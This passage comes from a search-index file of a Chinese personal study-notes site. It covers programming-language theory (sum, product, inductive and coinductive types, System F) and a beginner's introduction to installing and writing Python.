l},\\ \\dfrac{e\\mapsto e'}{e\\cdot r\\mapsto e'\\cdot r}\\)</li> <li>\\(\\dfrac{[e_1\\text{ val}]\\quad [e_2\\text{ val}]}{\\langle e_1, e_2\\rangle\\cdot l\\mapsto e_1},\\ \\dfrac{[e_1\\text{ val}]\\quad [e_2\\text{ val}]}{\\langle e_1, e_2\\rangle\\cdot r\\mapsto e_2}\\)</li> </ul> </li> <li>\u5b89\u5168\u6027</li> </ul> </li> <li>\u79ef\u7c7b\u578b\u7684 PL \u610f\u4e49\uff1a\u7ed3\u6784\u4f53 struct \u7ec4\u5408\u7c7b\u578b</li> <li> <p>\u539f\u59cb\u4e92\u9012\u5f52</p> <ul> <li>\u7b80\u5316 \\(\\mathrm{rec}\\{e_0; x.y.e_1\\}(e)\\)\uff0c\u53ef\u4ee5\u5b9a\u4e49\u4e3a \\(e'\\cdot r\\)\uff0c\u5176\u4e2d \\(e'\\) \u4e3a\uff1a</li> <li>\\(\\mathrm{iter}\\{\\langle \\mathrm{z}, e_0\\rangle; x'.\\langle s(x'\\cdot l), [x'\\cdot r/x]e_1\\rangle\\}(e)\\)</li> </ul> \u539f\u59cb\u4e92\u9012\u5f52\u7684\u4f8b\u5b50 <p>\u5b9a\u4e49\u4e24\u4e2a\u51fd\u6570\u7684\u9012\u5f52\u65b9\u7a0b \\(e(0)=1, o(0)=0, e(n+1)=o(n), o(n+1)=e(n)\\)</p> <p>\u5b9a\u4e49\u8f85\u52a9\u51fd\u6570 \\(e_{eo}\\)\uff0c\u7c7b\u578b\u4e3a \\(\\mathrm{nat}\\rightarrow\\mathrm{nat}\\times\\mathrm{nat}\\)\uff1a</p> \\[ \\lambda(n:\\mathrm{nat})\\ \\mathrm{iter}\\ n\\{\\mathrm{z}\\hookrightarrow\\langle 1, 0\\rangle\\ |\\ \\mathrm{s}(b)\\hookrightarrow\\langle b\\cdot r, b\\cdot l\\rangle\\} \\] <p>\u6709\u5176 \\(l\\) \u4e3a \\(e\\) \u51fd\u6570\u7684\u53d6\u503c\uff0c\\(r\\) \u4e3a \\(o\\) \u51fd\u6570\u7684\u53d6\u503c</p> </li> </ul>"},{"location":"cs/pl/ppl/topic5/#_4","title":"\u548c\u7c7b\u578b","text":"<ul> <li>\u8bed\u6cd5\uff1a<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{void}\\) \u7a7a\u548c / \\(\\mathrm{sum}(\\tau_1; \\tau_2)\\) \u4e8c\u5143\u548c \\(\\tau_1+\\tau_2\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{abort}\\{\\tau\\}(e)\\) \u7ec8\u6b62</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{in[l]}\\{\\tau_1; \\tau_2\\}(e)\\) \u5de6\u6ce8\u5165\uff08\\(l\\cdot e\\)\uff09/ \\(\\mathrm{in[r]}\\{\\tau_1; \\tau_2\\}(e)\\) \u53f3\u6ce8\u5165<ul> <li>\u6784\u9020\u5f62\u5f0f\uff08\u79ef\u7c7b\u578b\u7684\u5de6\u6295\u5f71\u53f3\u6295\u5f71\u662f\u6d88\u53bb\u5f62\u5f0f\uff09</li> </ul> </li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{case}(e; x_1.e_1; x_2.e_2)\\) \u6d88\u53bb\u5f62\u5f0f\uff0c\\(\\mathrm{case}\\ e\\{l\\cdot x_1\\hookrightarrow e_1\\ |\\ r\\cdot x_2\\hookrightarrow e_2\\}\\)</li> </ul> </li> <li>\u90e8\u5206\u9759\u6001\u8bed\u4e49\uff1a<ul> <li>\\(\\dfrac{\\Gamma\\vdash e:\\tau_1}{\\Gamma\\vdash l\\cdot e:\\tau_1+\\tau_2}, \\dfrac{\\Gamma\\vdash e:\\tau_2}{\\Gamma\\vdash r\\cdot e:\\tau_1+\\tau_2}\\)</li> </ul> </li> <li>\\(\\mathrm{case}\\) \u7684\u52a8\u6001\u8bed\u4e49\uff1a<ul> <li>\\(\\dfrac{[e\\text{ val}]}{\\mathrm{case}\\ l\\cdot e\\{l\\cdot x_1\\hookrightarrow e_1\\ |\\ r\\cdot x_2\\hookrightarrow e_2\\}\\mapsto [e/x_1]e_1}\\)</li> </ul> </li> <li>\u548c\u7c7b\u578b\u7684 PL \u610f\u4e49\uff1aenum \u679a\u4e3e</li> <li>\u4e0e\u79ef\u7c7b\u578b\u7684\u533a\u522b\uff1a\\(e:\\mathrm{unit}\\) \u53ef\u4ee5\u6c42\u503c\u5f97\u5230 \\(\\langle\\rangle\\) \u4f46\u6ca1\u610f\u4e49\uff0c\\(e:\\mathrm{void}\\) \u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u4e00\u4e2a\u503c</li> <li>\u5e03\u5c14\u7c7b\u578b\uff1a<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{bool}\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{true}\\) / \\(\\mathrm{false}\\) / \\(\\mathrm{if}(e; e_1; e_2)\\)</li> <li>\u4e5f\u53ef\u4ee5\u7528\u4e8c\u5143\u548c\u548c\u7a7a\u79ef\u6765\u5b9a\u4e49\uff1a<ul> <li>\\(\\mathrm{bool} = \\mathrm{unit} + \\mathrm{unit}\\)</li> <li>\\(\\mathrm{true} = l\\cdot \\langle\\rangle,\\ \\mathrm{false} = r\\cdot\\langle\\rangle\\)</li> <li>\\(\\text{if }e\\text{ then }e_1\\text{ else }e_2 = \\mathrm{case}\\ e\\{l\\cdot x_1\\hookrightarrow e_1\\ |\\ r\\cdot x_2\\hookrightarrow e_2\\}\\)</li> </ul> </li> </ul> </li> <li>Option \u7c7b\u578b\uff1a<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{opt}(\\tau)\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{null}\\) \u7a7a / \\(\\mathrm{just}(e)\\) \u6709\u503c</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{ifnull}\\{\\tau\\}\\{e_1; x.e_2\\}(e)\\) \u5982\u679c \\(e\\) \u662f \\(\\mathrm{null}\\) \u5219\u503c\u4e3a \\(e_1\\)\uff0c\u5426\u5219\u5982\u679c\u4e3a \\(\\mathrm{just}(x)\\) \u5219\u503c\u4e3a \\(e_2\\)</li> <li>\u7528\u548c\u548c\u7a7a\u79ef\u5b9a\u4e49\uff1a<ul> <li>\\(\\tau\\text{ opt} = \\mathrm{unit} + \\tau\\)</li> <li>\\(\\mathrm{null} = l\\cdot\\langle\\rangle,\\ \\mathrm{just}(e) = r\\cdot e\\)</li> <li>\\(\\mathrm{ifnull}\\ e\\{\\mathrm{null}\\hookrightarrow e_1\\ |\\ \\mathrm{just}(x)\\hookrightarrow e_2\\} = \\mathrm{case}\\ e\\{l\\cdot \\underline{\\ \\ }\\hookrightarrow e_1\\ |\\ r\\cdot x_2\\hookrightarrow e_2\\}\\)</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic5/#_5","title":"\u65e0\u9650\u6570\u636e\u7c7b\u578b","text":""},{"location":"cs/pl/ppl/topic5/#_6","title":"\u6cdb\u578b\u7f16\u7a0b","text":"<ul> <li>\u7c7b\u578b\u7b97\u5b50\uff1a\\(t.\\tau\\)\uff0c\u8868\u793a \\(\\tau\\) \u7c7b\u578b\u4e2d\u5b58\u5728\u4e00\u4e2a\u6ca1\u6709\u786e\u5b9a\u7684\u7c7b\u578b \\(t\\)\uff0c\u662f\u5176\u4ed6\u7c7b\u578b\u8981\u4f5c\u7528\u7684\u4f4d\u7f6e<ul> <li>\u6bd4\u5982\u5b58\u5728 \\(f\\colon \\rho\\to\\rho'\\)\uff0c\u4ee5\u53ca \\(\\tau=\\mathrm{bool}\\times t\\)</li> <li>\u5219 \\(f\\) \u53ef\u4ee5\u6269\u5c55\u4e3a \\(\\mathrm{bool}\\times\\rho\\to\\mathrm{bool}\\times\\rho'\\)</li> </ul> </li> <li>\u591a\u9879\u5f0f\u7c7b\u578b\u7b97\u5b50\uff1a\u7531\u7c7b\u578b\u53d8\u91cf \\(t\\)\uff0c\u7c7b\u578b \\(\\mathrm{void}, \\mathrm{unit}\\) \u4ee5\u53ca\u7c7b\u578b\u6784\u9020\u5668 \\(+, \\times\\) \u6784\u6210\u7684\u7c7b\u578b\u7b97\u5b50<ul> <li>\u65ad\u8a00\uff1a\\(t.\\tau\\text{ poly}\\)</li> <li>\u6cdb\u578b\u6269\u5c55\uff1a\\(\\mathsf{Exp}\\ e := \\mathrm{map}\\{t.\\tau\\}(x.e')(e)\\)</li> <li>\u9759\u6001\u8bed\u4e49\uff1a\\(\\dfrac{t.\\tau\\text{ poly}\\quad\\Gamma,x:\\rho\\vdash e':\\rho'\\quad\\Gamma\\vdash e:[\\rho/t]\\tau}{\\Gamma\\vdash\\mathrm{map}\\{t.\\tau\\}(x.e')(e):[\\rho'/t]\\tau}\\)</li> <li>\u4f8b\u5982 \\(t.\\tau\\) \u4e3a \\(t.(\\mathrm{unit}+\\mathrm{bool}\\times t)\\)\uff0c\\(x.e\\) \u4e3a \\(x.\\mathrm{s}(x)\\)<ul> <li>\u5219 \\(\\mathrm{map}\\{t.\\tau\\}(x.e)(r\\cdot\\langle\\mathrm{true}, n\\rangle)\\mapsto^* r\\cdot\\langle\\mathrm{true}, n + 1\\rangle\\)</li> </ul> </li> </ul> </li> <li>\u6b63\u7c7b\u578b\u7b97\u5b50<ul> <li>\u6b63\u51fa\u73b0\uff1a\u7c7b\u578b\u53d8\u91cf\u51fa\u73b0\u5728\u503c\u57df\u4e2d\uff0c\u8d1f\u51fa\u73b0\uff1a\u7c7b\u578b\u53d8\u91cf\u51fa\u73b0\u5728\u5b9a\u4e49\u57df\u4e2d</li> <li>\\(t.\\tau_1\\to\\tau_2\\) \u662f\u6b63\u7c7b\u578b\u7b97\u5b50\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(t\\) \u4e0d\u51fa\u73b0\u5728 \\(\\tau_1\\) \u4e2d\u4e14  \\(t.\\tau_2\\) \u662f\u6b63\u7c7b\u578b\u7b97\u5b50</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic5/#_7","title":"\u5f52\u7eb3\u7c7b\u578b\u4e0e\u4f59\u5f52\u7eb3\u7c7b\u578b","text":"<ul> <li>\u90fd\u662f\u9012\u5f52\u7c7b\u578b\uff0c\u5f52\u7eb3\u7c7b\u578b\uff08inductive\uff09\u5bf9\u5e94\u7c7b\u578b\u7684\u6700\u5c0f\u89e3\uff0c\u4f59\u5f52\u7eb3\u7c7b\u578b\uff08coinductive\uff09\u5bf9\u5e94\u7c7b\u578b\u7684\u6700\u5927\u89e3<ul> <li>\u5982\u679c\u6307\u5b9a\u4e86\u51fd\u6570\u5728\u5f52\u7eb3\u7c7b\u578b\u7684\u6bcf\u79cd\u5f15\u2f0a\u5f62\u5f0f\u4e0a\u7684\u2f8f\u4e3a\uff0c\u5c31\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7684\u6240\u6709\u503c\u5b9a\u4e49\u4e86\u51fd\u6570\u7684\u2f8f\u4e3a\u3002\u8fd9\u6837\u7684\u51fd\u6570\u79f0\u4e3a\u8fed\u4ee3\u5f0f\uff08iterator\uff09</li> <li>\u4f59\u5f52\u7eb3\u7c7b\u578b\u7684\u5143\u7d20\u5bf9\u6d88\u53bb\u5f62\u5f0f\u7684\u6709\u9650\u6b21\u590d\u5408\u505a\u51fa\u6b63\u786e\u7684\u54cd\u5e94\u2f8f\u4e3a\uff0c\u8fd9\u6837\u7684\u5143\u7d20\u79f0\u4e3a\u2f63\u6210\u5668\uff08generator\uff09</li> </ul> </li> <li>\u5f52\u7eb3\u7c7b\u578b\u7684\u5143\u7d20\u662f\u5bf9\u5176\u5f15\u5165\u5f62\u5f0f\u8fdb\u884c\u6709\u9650\u6b21\u590d\u5408\u5f97\u5230\u7684</li> <li>\u5f52\u7eb3\u7c7b\u578b\u7684\u4f8b\u5b50\uff1a\u6570\u636e\u96c6 \\(A\\) \u4e0a\u7684\u6709\u9650\u8868\u96c6\uff1a<ul> <li>\u57fa\u7840\u60c5\u51b5\uff1a\\(\\mathrm{nil}\\) \u662f\u6709\u9650\u8868</li> <li>\u8fed\u4ee3\u89c4\u5219\uff1a\u5982\u679c \\(a\\in A\\) \u4e14 \\(\\sigma\\) \u662f\u6709\u9650\u8868\uff0c\u5219 \\(\\mathrm{cons}(a, \\sigma)\\) \u662f\u6709\u9650\u8868</li> <li>\u6700\u5c0f\u5316\u6761\u4ef6\uff1a\u9664\u6b64\u4e4b\u5916\uff0c\u6709\u9650\u8868\u96c6\u4e2d\u4e0d\u542b\u5176\u5b83\u5143\u7d20</li> </ul> </li> <li>\u4f59\u5f52\u7eb3\u7c7b\u578b\u7684\u4f8b\u5b50\uff1a\u6570\u636e\u96c6 \\(A\\) \u4e0a\u7684\u65e0\u9650\u8868\u96c6\uff08\u6d41\uff09\uff1a<ul> <li>\u8fed\u4ee3\u89c4\u5219\uff1a\u5982\u679c \\(a\\in A\\) \u4e14 \\(\\sigma\\) \u662f\u65e0\u9650\u8868\uff0c\u5219 \\(\\mathrm{cons}(a, \\sigma)\\) \u662f\u65e0\u9650\u8868</li> <li>\u6700\u5927\u5316\u6761\u4ef6\uff1a\u6570\u636e\u96c6 \\(A\\) \u4e0a\u7684\u65e0\u9650\u8868\u96c6\u662f\u6ee1\u8db3\u8fed\u4ee3\u89c4\u5219\u7684\u6700\u5927\u96c6\u5408</li> </ul> </li> <li>\u89c2\u5bdf\u7b97\u5b50\uff1a<ul> <li>\\(\\mathrm{head}(\\mathrm{cons}(a, \\sigma)) = a\\)</li> <li>\\(\\mathrm{tail}(\\mathrm{cons}(a, \\sigma)) = \\sigma\\)</li> </ul> </li> <li>\u5f52\u7eb3\u7c7b\u578b\u4e0a\u7684\u51fd\u6570\uff1a<ul> <li>\\(\\mathrm{length}(\\mathrm{nil}) = 0\\)</li> <li>\\(\\mathrm{length}(\\mathrm{cons}(a, \\sigma)) = 1 + \\mathrm{length}(\\sigma)\\)</li> </ul> </li> <li>\u4f59\u5f52\u7eb3\u7c7b\u578b\u4e0a\u7684\u51fd\u6570<ul> <li>\u6709\u51fd\u6570 \\(f\\colon A\\to A\\)\uff0c\u5b9a\u4e49 \\(\\mathrm{ext}(f)\\) \u628a \\(f\\) \u4f5c\u7528\u5728\u65e0\u9650\u8868\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\u5f97\u5230\u65b0\u7684\u65e0\u9650\u8868 \\(\\mathrm{ext}(f)(\\sigma)\\)<ul> <li>\\(\\mathrm{head}(\\mathrm{ext}(f)(\\sigma)) = f(\\mathrm{head}(\\sigma))\\)</li> <li>\\(\\mathrm{tail}(\\mathrm{ext}(f)(\\sigma)) = \\mathrm{ext}(f)(\\mathrm{tail}(\\sigma))\\)</li> </ul> </li> <li>\\(\\mathrm{odd}\\) \u5e94\u7528\u5728\u65e0\u9650\u8868\u4e0a\uff0c\u5ffd\u7565\u6240\u6709\u5076\u6570\u4f4d\u7f6e\u4e0a\u7684\u5143\u7d20\uff0c\u5c06\u5269\u4f59\u5143\u7d20\u6309\u539f\u6765\u6b21\u5e8f\u5f62\u6210\u65b0\u8868</li> </ul> </li> <li>\u4e92\u6a21\u62df\uff08bisimulation\uff09\uff1a\u5373\u4e24\u4e2a\u8868\u7b49\u4ef7\uff0c\u5373 head \u76f8\u7b49\uff0ctail \u4e92\u6a21\u62df<ul> <li>\\(\\mathrm{merge}\\) \u8868\u793a\u4f9d\u6b21\u4ece\u4e24\u4e2a\u8868\u8f6e\u6d41\u53d6\u5143\u7d20\u751f\u6210\u8868<ul> <li>\u5219 \\(\\mathrm{merge}(\\mathrm{odd}(\\sigma), \\mathrm{even}(\\sigma))\\) \u548c \\(\\sigma\\) \u4e92\u6a21\u62df</li> </ul> </li> </ul> </li> <li>\u81ea\u7136\u6570\u7c7b\u578b\u4f5c\u4e3a\u5f52\u7eb3\u7c7b\u578b\uff1a<ul> <li>\\(\\dfrac{\\Gamma\\vdash e:\\mathrm{unit}+\\mathrm{nat}}{\\Gamma\\vdash\\mathrm{fold}_\\mathrm{nat}(e):\\mathrm{nat}}\\), \\(\\dfrac{\\Gamma, x:\\mathrm{unit}+\\tau\\vdash e_1:\\tau\\quad\\Gamma\\vdash e_2:\\mathrm{nat}}{\\Gamma\\vdash\\mathrm{rec}_\\mathrm{nat}(x.e_1;e_2):\\tau}\\)</li> <li>\\(\\mathrm{z} = \\mathrm{fold}_\\mathrm{nat}(l\\cdot\\langle\\rangle)\\), \\(\\mathrm{s}(e) = \\mathrm{fold}_\\mathrm{nat}(r\\cdot e)\\)</li> </ul> </li> <li>\u4f59\u5f52\u7eb3\u7c7b\u578b\uff1a\u81ea\u7136\u6570\u7684\u6d41\u7c7b\u578b<ul> <li>\u6bcf\u4e2a\u5143\u7d20\u8981\u5728\u6240\u6709\u4e4b\u524d\u7684\u5143\u7d20\u88ab\u8ba1\u7b97\u51fa\u6765\u4e4b\u540e\u624d\u80fd\u88ab\u8ba1\u7b97\u51fa\u6765</li> <li>\u6d41\u7684\u5f15\u5165\u5f62\u5f0f\u548c\u81ea\u7136\u6570\u7684\u6d88\u53bb\u5f62\u5f0f\u662f\u5bf9\u5076\u7684</li> <li>\\(\\mathrm{hd}(\\mathrm{gen}_\\mathrm{stream}\\ x\\text{ is }e\\text{ in }\\langle\\mathrm{hd}\\hookrightarrow e_1, \\mathrm{tl}\\hookrightarrow e_2\\rangle) \\mapsto [e/x]e_1\\)</li> <li>\\(\\mathrm{tl}(\\mathrm{gen}_\\mathrm{stream}\\ x\\text{ is } e\\text{ in }\\langle\\mathrm{hd}\\hookrightarrow e_1, \\mathrm{tl}\\hookrightarrow e_2\\rangle)\\)<ul> <li>\\(\\mapsto \\mathrm{gen}_\\mathrm{stream}\\ x\\text{ is }[e/x]e_2\\text{ in }\\langle\\mathrm{hd}\\hookrightarrow e_1, \\mathrm{tl}\\hookrightarrow e_2\\rangle\\)</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic5/#_8","title":"\u591a\u6001\u7c7b\u578b","text":"<ul> <li>\u5373\u51fd\u6570\u7684\u7c7b\u578b\u4e0d\u552f\u4e00<ul> <li>\u6bd4\u5982 id: 'a -&gt; 'a \u6052\u7b49\u51fd\u6570\uff0c\u4e0d\u5fc5\u6307\u5b9a\u4e00\u4e2a\u7279\u5b9a\u7c7b\u578b</li> </ul> </li> <li>\u5e26\u7c7b\u578b\u7684 \u03bb \u6f14\u7b97<ul> <li>\\(\\Lambda(\\alpha)\\lambda(x:\\alpha)\\ x\\)</li> <li>\u7c7b\u578b\u5e94\u7528\uff1a\\(\\Lambda(\\alpha)\\lambda(x:\\alpha)\\ x[\\mathrm{int}]\\vdash [\\mathrm{int}/\\alpha](\\lambda(x:\\alpha)\\ x)=\\lambda(x:\\text{int})\\ x\\)</li> </ul> </li> <li>\u591a\u6001\u7c7b\u578b\u7684 F \u7cfb\u7edf<ul> <li>\\(\\mathsf{Typ}\\ \\tau ::= t\\) \u7c7b\u578b\u53d8\u91cf</li> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{arr}(\\tau_1;\\tau_2)\\) \u51fd\u6570\u7c7b\u578b \\(\\tau_1\\to\\tau_2\\)</li> <li>\\(\\mathsf{Typ}\\ \\tau ::= \\mathrm{all}(t.\\tau)\\) \u591a\u6001\u7c7b\u578b\uff08\u5168\u79f0\u7c7b\u578b\uff09\\(\\forall(t.\\tau)\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= x\\) \u53d8\u91cf</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{lam}\\{\\tau\\}(x.e)\\) \u51fd\u6570\u62bd\u8c61 \\(\\lambda(x:\\tau)\\ e\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{ap}(e_1; e_2)\\) \u51fd\u6570\u5e94\u7528 \\(e_1(e_2)\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{Lam}(t.e)\\) \u7c7b\u578b\u62bd\u8c61 \\(\\Lambda(t)\\ e\\)</li> <li>\\(\\mathsf{Exp}\\ e ::= \\mathrm{App}\\{\\tau\\}(e)\\) \u7c7b\u578b\u5e94\u7528 \\(e[\\tau]\\)</li> </ul> </li> <li>\u9759\u6001\u8bed\u4e49<ul> <li>\u8c13\u8a00\uff1a\u7c7b\u578b\u5f62\u6210 \\(\\Delta\\vdash\\tau\\text{ type}\\)\uff0c\u5b9a\u578b \\(\\Delta\\Gamma\\vdash e:\\tau\\)</li> <li>\u7c7b\u578b\u5f62\u6210\uff1a\\(\\dfrac{}{\\Delta, t\\text{ type}\\vdash t\\text{ type}},\\ \\dfrac{\\Delta, t\\text{ type}\\vdash\\tau\\text{ type}}{\\Delta\\vdash\\forall(t.\\tau)\\text{ type}}\\)</li> <li>\u7b97\u5b50\u7684\u7c7b\u578b\uff1a\\(\\dfrac{\\Delta, t\\text{ type}\\quad\\Gamma\\vdash e:\\tau}{\\Delta\\Gamma\\vdash\\Lambda(t)\\ e:\\forall(t.\\tau)},\\ \\dfrac{\\Delta\\Gamma\\vdash e:\\forall(t.\\tau')\\quad\\Delta\\vdash\\tau\\text{ type}}{\\Delta\\Gamma\\vdash e[\\tau]:[\\tau/t]\\tau'}\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic6/","title":"\u9012\u5f52\u7cfb\u7edf PCF","text":"<p> \u7ea6 25 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u5341\u4e09\u5468\u81f3\u7b2c\u5341\u516d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/pl/python/","title":"Python","text":"<p>Abstract</p> <p>\u6211\u5728 2018 \u5e74\u63a5\u89e6\u7684\u7b2c\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\uff0c\u4e5f\u662f\u6700\u5e38\u7528\u3001\u6700\u719f\u7ec3\u7684\u4e00\u95e8\u4e86</p> <p>\u8fd9\u91cc\u4e1c\u897f\u8fd8\u4e0d\u5168\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5145\u5427 (:\u0437\u300d\u2220)</p>"},{"location":"cs/pl/python/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Python \u8bed\u6cd5\u57fa\u7840</li> <li>NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93\uff08TODO\uff09</li> <li>PIL \u56fe\u50cf\u5904\u7406\u5e93\uff08TODO\uff09</li> <li>MatPlotLib \u4f5c\u56fe\u5e93\uff08\u751a\u81f3\u6587\u4ef6\u5939\u90fd\u6ca1\u5efa\uff09</li> </ul>"},{"location":"cs/pl/python/basic/","title":"Python \u8bed\u6cd5\u57fa\u7840","text":"<p> \u7ea6 5545 \u4e2a\u5b57  228 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 21 \u5206\u949f</p> <p>Abstract</p> <p>\u61d2\u5f97\u518d\u6574\u7406\u4e86\uff0c\u57fa\u672c\u4e0a\u662f\u4e4b\u524d\u4e00\u6b21 Python \u57fa\u7840\u6559\u5b66\u76f4\u64ad\u7684 slides \u6587\u5b57\u5185\u5bb9\uff0c\u5173\u4e8e\u57fa\u7840\u6559\u5b66\uff1a</p> <ul> <li>GitHub \u4ed3\u5e93\uff1a TonyCrane/PythonLecture</li> <li>slides\uff1ahttps://slides.tonycrane.cc/PythonLecture/</li> <li>\u90e8\u5206\u76f4\u64ad\u56de\u653e\uff1ahttps://www.bilibili.com/video/BV13Z4y1h7x5/?vd_source=c0de364997e494206a0fb88c9ee8bfb1</li> </ul> <p>\u8fd9\u91cc\u662f\u7eaf\u7684 slides \u6539\u5199\uff0c\u6548\u679c\u6ca1\u6709\u76f4\u63a5\u770b slides \u597d\uff0c\u800c\u4e14\u53ef\u80fd\u6709\u9519\u8bef\uff0c\u53d1\u73b0\u8bf7\u53ca\u65f6\u8bc4\u8bba\u544a\u8bc9\u6211</p>"},{"location":"cs/pl/python/basic/#python_1","title":"\u4ec0\u4e48\u662f python","text":"<ul> <li>\u89e3\u91ca\u6027\u7684\u811a\u672c\u8bed\u8a00\uff1a\u901a\u8fc7\u89e3\u91ca\u5668\u6765\u76f4\u63a5\u8fd0\u884c\uff0c\u4e0d\u9700\u8981\u7f16\u8bd1\u94fe\u63a5\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6</li> <li>\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff1a\u7c7b\u578b\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\uff0c\u4e0d\u9700\u8981\u901a\u8fc7\u4ee3\u7801\u660e\u6587\u89c4\u5b9a</li> <li>\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff1apython \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61</li> <li>...</li> </ul>"},{"location":"cs/pl/python/basic/#python_2","title":"\u600e\u4e48\u88c5 python","text":"<ul> <li>\u88c5\u7684\u662f\u4ec0\u4e48\uff1f<ul> <li>\u662f\u4e00\u4e2a python \u89e3\u91ca\u5668\uff0c\u4ee5\u53ca\u8fd0\u884c\u9700\u8981\u7684\u73af\u5883</li> </ul> </li> <li>\u600e\u4e48\u88c5\uff1f<ul> <li>\u5b98\u65b9\u7f51\u7ad9 https://www.python.org/downloads/</li> <li>conda\uff08\u4e00\u4e2a\u597d\u7528\u7684 python \u73af\u5883\u7ba1\u7406\u5de5\u5177\uff09<ul> <li>anaconda \uff08\u5927\u3001\u6709\u9884\u88c5\u73af\u5883\uff09https://www.anaconda.com/</li> <li>miniconda \uff08\u5c0f\uff09https://docs.conda.io/en/latest/miniconda</li> </ul> </li> <li>\u6781\u4e0d\u5efa\u8bae\u901a\u8fc7\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\u5b89\u88c5 python</li> </ul> </li> <li>\u88c5\u4ec0\u4e48\u7248\u672c\uff1f<ul> <li>\u4e24\u4e2a\u5927\u7248\u672c\uff0c2.* \u548c 3.*\uff0c\u5dee\u522b\u8f83\u5927\uff0c\u5efa\u8bae 3.*</li> <li>\u4e00\u4e9b\u5c0f\u7248\u672c\uff0c3.6 \u53ca\u4e4b\u524d\u4e0d\u63a8\u8350\uff0c3.7 3.8 \u7a33\u5b9a\uff0c3.9 3.10 \u5b8c\u5584\u4e2d\uff0c3.11 \u9884\u89c8\u4e2d</li> <li>\u7ec6\u5206\u7248\u672c\uff0c\u9009\u62e9\u6700\u65b0\uff0c3.7.13\u30013.8.13\u30013.9.12\u30013.10.4</li> <li>conda \u4e0d\u5fc5\u62c5\u5fc3\u7248\u672c\uff0c\u9ed8\u8ba4 3.9\uff0c\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u865a\u62df\u73af\u5883\u6765\u4f7f\u7528\u4e0d\u540c\u7248\u672c</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#python_3","title":"\u600e\u4e48\u7f16\u5199\u3001\u8fd0\u884c python","text":"<ul> <li>\u600e\u4e48\u7528 python\uff1f<ul> <li>\u8bb0\u4f4f\u4f60\u4e0b\u8f7d\u7684\u662f\u4e00\u4e2a\u89e3\u91ca\u5668\uff0c\u5efa\u8bae\u901a\u8fc7\u547d\u4ee4\u884c\u8fd0\u884c python code.py</li> </ul> </li> <li>\u4ec0\u4e48\u662f\u547d\u4ee4\u884c\uff1f<ul> <li>\u901a\u8fc7\u8f93\u5165\u547d\u4ee4\u6765\u901a\u77e5\u7535\u8111\u6267\u884c\u67d0\u6307\u4ee4\u3001\u6216\u8005\u8fd0\u884c\u67d0\u7a0b\u5e8f</li> <li>Windows\uff1acmd\u3001Powershell -&gt; \u5355\u72ec\u8fd0\u884c / Windows Terminal /...</li> <li>macOS\uff1azsh\u3001... -&gt; \u7ec8\u7aef / iTerm /...</li> <li>Linux\uff1abash\u3001zsh\u3001... -&gt; \u7ec8\u7aef / ...</li> </ul> </li> <li>\u7528\u4ec0\u4e48\u5199\u4ee3\u7801\uff1f<ul> <li>\u8bb0\u4f4f\u4f60\u7f16\u5199\u7684\u53ea\u662f\u4e00\u4e2a .py \u4f5c\u4e3a\u6269\u5c55\u540d\u7684\u6587\u672c\u6587\u4ef6 \u53ea\u8981\u6587\u672c\u7f16\u8f91\u5668\u90fd\u53ef\u4ee5\u5199</li> <li>\u8bb0\u4e8b\u672c\u3001\u81ea\u5e26 IDLE\u3001word</li> <li>Notepad++\u3001Sublime Text</li> <li>VSCode\uff08Visual Studio Code\uff0c\u4e0d\u662f VS\uff09code.visualstudio.com</li> <li>Pycharm\uff08Community Edition \u5c31\u591f\u7528\uff09jetbrains.com/pycharm</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_1","title":"\u53d8\u91cf","text":"<ul> <li>\u7ed9\u4e00\u4e2a\u5185\u5bb9\u7ed1\u5b9a\u4e00\u4e2a\u6807\u7b7e\u5373\u53d8\u91cf\u540d\uff08\u6ce8\u610f\u8bf7\u4e0d\u8981\u8ba4\u4e3a\u53d8\u91cf\u7c7b\u4f3c\u4e00\u4e2a\u201c\u76d2\u5b50\u201d\uff09</li> <li>\u901a\u8fc7 = \u6765\u5b9a\u4e49\u53d8\u91cf\uff0c\u53d8\u91cf\u540d = \u5185\u5bb9</li> <li>\u52a8\u6001\u7c7b\u578b\uff0c\u4e0d\u9700\u8981\u89c4\u5b9a\u7c7b\u578b\uff08\u53ef\u4ee5\u901a\u8fc7 <code>\u53d8\u91cf\u540d: \u7c7b\u578b = 